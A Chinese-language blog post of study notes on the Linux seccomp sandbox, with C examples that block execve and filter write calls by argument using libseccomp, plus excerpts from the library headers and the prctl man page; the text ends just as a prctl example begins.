<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">










<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="做了这么久的pwn,用seccomp做沙箱保护已经见了不是一次两次了,有时候seccomp后面会跟一个结构体,之前遇到这种限制基本靠猜,毕竟自己没有写过seccomp相关的程序.最近又见到几次,想趁此机会学习一把.">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="seccomp学习笔记">
<meta property="og:url" content="https://veritas501.github.io/2018/05/05/seccomp学习笔记/index.html">
<meta property="og:site_name" content="Veritas501&#39;s Blog">
<meta property="og:description" content="做了这么久的pwn,用seccomp做沙箱保护已经见了不是一次两次了,有时候seccomp后面会跟一个结构体,之前遇到这种限制基本靠猜,毕竟自己没有写过seccomp相关的程序.最近又见到几次,想趁此机会学习一把.">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-05-05T11:21:06.261Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="seccomp学习笔记">
<meta name="twitter:description" content="做了这么久的pwn,用seccomp做沙箱保护已经见了不是一次两次了,有时候seccomp后面会跟一个结构体,之前遇到这种限制基本靠猜,毕竟自己没有写过seccomp相关的程序.最近又见到几次,想趁此机会学习一把.">






  <link rel="canonical" href="https://veritas501.github.io/2018/05/05/seccomp学习笔记/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>seccomp学习笔记 | Veritas501's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Veritas501's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-guestbook">
    <a href="/Guestbook" rel="section">
      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />Guestbook</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2018/05/05/seccomp学习笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Veritas501">
      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
      <meta itemprop="image" content="/images/215.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veritas501's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">seccomp学习笔记
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-05-05 00:00:00 / Modified: 19:21:06" itemprop="dateCreated datePublished" datetime="2018-05-05T00:00:00+08:00">2018-05-05</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/05/05/seccomp学习笔记/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2018/05/05/seccomp学习笔记/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/05/05/seccomp学习笔记/" class="leancloud_visitors" data-flag-title="seccomp学习笔记">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>做了这么久的pwn,用seccomp做沙箱保护已经见了不是一次两次了,有时候seccomp后面会跟一个结构体,之前遇到这种限制基本靠猜,毕竟自己没有写过seccomp相关的程序.最近又见到几次,想趁此机会学习一把.</p>
<a id="more"></a>
<h2 id="What-is-seccomp"><a href="#What-is-seccomp" class="headerlink" title="What is seccomp"></a>What is seccomp</h2><blockquote>
<p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. It was merged into the Linux kernel mainline in kernel version 2.6.12, which was released on March 8, 2005. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p>
</blockquote>
<p>用自己的话来说,就是说seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,这是不安全的,比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</p>
<h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>首先,调用seccomp的程序我们是能够直接运行的,但是我们不能直接编写调用seccomp的程序,因为我们缺少相应的头文件.通过apt安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure>
<p>这样应该就有头文件了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in /usr/include</span><br><span class="line">$ find . -name seccomp.h</span><br><span class="line">./seccomp.h</span><br><span class="line">./linux/seccomp.h</span><br></pre></td></tr></table></figure>
<p>先写一个简单的程序调用一下syscall,简单的输出后,会弹一个shell</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g simple_syscall.c -o simple_syscall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">	<span class="keyword">char</span> * argv[] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"i will give you a shell\n"</span>,<span class="number">24</span>);</span><br><span class="line">	syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在我们通过seccomp禁用掉execve的syscall.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">	<span class="keyword">char</span> * argv[] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"i will give you a shell\n"</span>,<span class="number">24</span>);</span><br><span class="line">	syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ ./simple_syscall_seccomp </span><br><span class="line">i will give you a shell</span><br><span class="line">[1]    14024 invalid system call (core dumped)  ./simple_syscall_seccomp</span><br></pre></td></tr></table></figure>
<p>稍微解释一下上面几个函数</p>
<p><code>ctx</code>是<code>Filter context/handle</code>,其中<code>typedef void *scmp_filter_ctx;</code><br><code>seccomp_init</code>是初始化的过滤状态,这里用的是<code>SCMP_ACT_ALLOW</code>,表示默认允许所有的syscacll.如果初始化状态为<code>SCMP_ACT_KILL</code>,则表示默认不允许所有的syscall</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * seccomp actions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kill the process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Throw a SIGSYS signal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the specified error code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Notify a tracing process with the specified value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allow the syscall to be executed after the action has been logged</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allow the syscall to be executed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span></span><br></pre></td></tr></table></figure>
<p><code>seccomp_rule_add</code>是添加一条规则,函数原形如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a new rule to the filter</span></span><br><span class="line"><span class="comment"> * @param ctx the filter context</span></span><br><span class="line"><span class="comment"> * @param action the filter action</span></span><br><span class="line"><span class="comment"> * @param syscall the syscall number</span></span><br><span class="line"><span class="comment"> * @param arg_cnt the number of argument filters in the argument filter chain</span></span><br><span class="line"><span class="comment"> * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function adds a series of new argument/value checks to the seccomp</span></span><br><span class="line"><span class="comment"> * filter for the given syscall; multiple argument/value checks can be</span></span><br><span class="line"><span class="comment"> * specified and they will be chained together (AND'd together) in the filter.</span></span><br><span class="line"><span class="comment"> * If the specified rule needs to be adjusted due to architecture specifics it</span></span><br><span class="line"><span class="comment"> * will be adjusted without notification.  Returns zero on success, negative</span></span><br><span class="line"><span class="comment"> * values on failure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">		     <span class="keyword">uint32_t</span> action, <span class="keyword">int</span> syscall, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg_cnt, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>seccomp_load</code>是应用过滤,如果不调用<code>seccomp_load</code>则上面所有的过滤都不会生效<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Loads the filter into the kernel</span></span><br><span class="line"><span class="comment"> * @param ctx the filter context</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function loads the given seccomp filter context into the kernel.  If</span></span><br><span class="line"><span class="comment"> * the filter was loaded correctly, the kernel will be enforcing the filter</span></span><br><span class="line"><span class="comment"> * when this function returns.  Returns zero on success, negative values on</span></span><br><span class="line"><span class="comment"> * error.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">seccomp_load</span><span class="params">(<span class="keyword">const</span> scmp_filter_ctx ctx)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>有一点需要再说一下,我们用的是<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code>,<code>arg_cnt</code>为0,表示我们直接限制execve,不管他什么参数.</p>
<p>如果<code>arg_cnt</code>不为0,那<code>arg_cnt</code>表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截syscall.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for use in declaring rules</span></span><br><span class="line"><span class="comment"> * @param arg the argument number, starting at 0</span></span><br><span class="line"><span class="comment"> * @param op the comparison operator, e.g. SCMP_CMP_*</span></span><br><span class="line"><span class="comment"> * @param datum_a dependent on comparison</span></span><br><span class="line"><span class="comment"> * @param datum_b dependent on comparison, optional</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Specify an argument comparison struct for argument 5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Comparison operators</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> scmp_compare &#123;</span><br><span class="line">	_SCMP_CMP_MIN = <span class="number">0</span>,</span><br><span class="line">	SCMP_CMP_NE = <span class="number">1</span>,		<span class="comment">/**&lt; not equal */</span></span><br><span class="line">	SCMP_CMP_LT = <span class="number">2</span>,		<span class="comment">/**&lt; less than */</span></span><br><span class="line">	SCMP_CMP_LE = <span class="number">3</span>,		<span class="comment">/**&lt; less than or equal */</span></span><br><span class="line">	SCMP_CMP_EQ = <span class="number">4</span>,		<span class="comment">/**&lt; equal */</span></span><br><span class="line">	SCMP_CMP_GE = <span class="number">5</span>,		<span class="comment">/**&lt; greater than or equal */</span></span><br><span class="line">	SCMP_CMP_GT = <span class="number">6</span>,		<span class="comment">/**&lt; greater than */</span></span><br><span class="line">	SCMP_CMP_MASKED_EQ = <span class="number">7</span>,		<span class="comment">/**&lt; masked equality */</span></span><br><span class="line">	_SCMP_CMP_MAX,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Argument datum</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> <span class="keyword">scmp_datum_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Argument / Value comparison definition</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scmp_arg_cmp</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> arg;	<span class="comment">/**&lt; argument number, starting at 0 */</span></span><br><span class="line">	<span class="keyword">enum</span> scmp_compare op;	<span class="comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span></span><br><span class="line">	<span class="keyword">scmp_datum_t</span> datum_a;</span><br><span class="line">	<span class="keyword">scmp_datum_t</span> datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>举几个栗子</p>
<p>比如我要只拦截哪些length等于0x10的write系统调用,可以这样写:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;seccomp.h&gt;</span><br><span class="line">#include &lt;linux/seccomp.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),1,SCMP_A2(SCMP_CMP_EQ,0x10));//第2(从0)个参数等于0x10</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line">	write(1,&quot;i will give you a shell\n&quot;,24);//不被拦截</span><br><span class="line">	write(1,&quot;1234567812345678&quot;,0x10);//被拦截</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>除了seccomp,还有一个叫<code>prctl</code>的函数也能做到类似的效果</p>
<p>函数原形<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>当option为<code>PR_SET_NO_NEW_PRIVS</code>(38),且arg2为1时,将无法获得特权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NO_NEW_PRIVS (since Linux 3.5)</span><br><span class="line">    Set the calling process&apos;s no_new_privs bit to the value in arg2.</span><br><span class="line">    With no_new_privs set to 1,  execve(2)  promises  not  to  grant</span><br><span class="line">    privileges  to do anything that could not have been done without</span><br><span class="line">    the execve(2) call (for example, rendering the  set-user-ID  and</span><br><span class="line">    set-group-ID  mode  bits, and file capabilities non-functional).</span><br><span class="line">    Once set, this bit cannot be unset.  The setting of this bit  is</span><br><span class="line">    inherited  by  children  created  by  fork(2)  and clone(2), and</span><br><span class="line">    preserved across execve(2).</span><br><span class="line">    </span><br><span class="line">    For   more   information,   see   the   kernel    source    file</span><br><span class="line">    Documentation/prctl/no_new_privs.txt.</span><br></pre></td></tr></table></figure></p>
<p>例子:</p>
